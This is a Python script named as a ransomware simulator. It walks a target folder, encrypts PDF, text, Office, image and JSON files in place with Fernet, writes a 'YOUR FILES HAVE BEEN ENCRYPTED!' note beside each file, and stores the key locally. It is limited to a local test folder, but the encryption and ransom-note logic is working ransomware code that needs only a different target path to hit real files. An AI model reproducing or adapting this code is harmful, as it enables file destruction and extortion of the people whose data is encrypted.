# ransomware_simulator.py
import os
import time
import json
import base64
from datetime import datetime
from cryptography.fernet import Fernet

class RansomwareSimulator:
    def __init__(self, encryption_key=None):
        # Target folder is in same directory
        self.target_folder = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'test_files', '1')
        self.key = encryption_key or Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.encrypted_files = []
        
    def scan_files(self):
        """Scan for target files"""
        target_extensions = ['.pdf', '.txt', '.docx', '.xlsx', '.jpg', '.png', '.json']
        files = []
        
        if not os.path.exists(self.target_folder):
            print(f"Creating test_files directory: {self.target_folder}")
            os.makedirs(self.target_folder)
            return files
        
        for root, dirs, filenames in os.walk(self.target_folder):
            for filename in filenames:
                if any(filename.endswith(ext) for ext in target_extensions):
                    files.append(os.path.join(root, filename))
        
        return files
    
    def encrypt_file(self, file_path):
        "Encrypt a single file"
        try:
            with open(file_path, 'rb') as f:
                original_data = f.read()
            
            # Encrypt the data
            encrypted_data = self.cipher.encrypt(original_data)
            
            # Write encrypted data back
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
            
            # Create ransom note
            ransom_note = f"""
YOUR FILES HAVE BEEN ENCRYPTED!
"""
            
            ransom_path = file_path + '.README_TO_DECRYPT.txt'
            with open(ransom_path, 'w') as f:
                f.write(ransom_note)
            
            self.encrypted_files.append(file_path)
            print(f"Encrypted: {os.path.basename(file_path)}")
            
        except Exception as e:
            print(f"Failed to encrypt {file_path}: {e}")
    
    def run_encryption(self):
        "Encrypt all found files"
        files = self.scan_files()
        
        if not files:
            print(f"No files found in {self.target_folder}")
            print("Add some .txt, .pdf, .json, .jpg files to test_files directory")
            return
        
        print(f"Found {len(files)} files to encrypt")
        
        for file_path in files:
            self.encrypt_file(file_path)
        
        print(f"Encrypted {len(self.encrypted_files)} files")
    
    def save_key(self):
        "Save decryption key"
        key_data = {
            'decryption_key': base64.b64encode(self.key).decode(),
            'encrypted_files': self.encrypted_files,
            'timestamp': datetime.now().isoformat()
        }
        
        key_path = os.path.join(os.path.dirname(__file__), 'decryption_key.json')
        with open(key_path, 'w') as f:
            json.dump(key_data, f, indent=2)
        
        print("Decryption key saved")

def main():
    ransomware = RansomwareSimulator()
    ransomware.run_encryption()
    ransomware.save_key()

if __name__ == "__main__":
    main()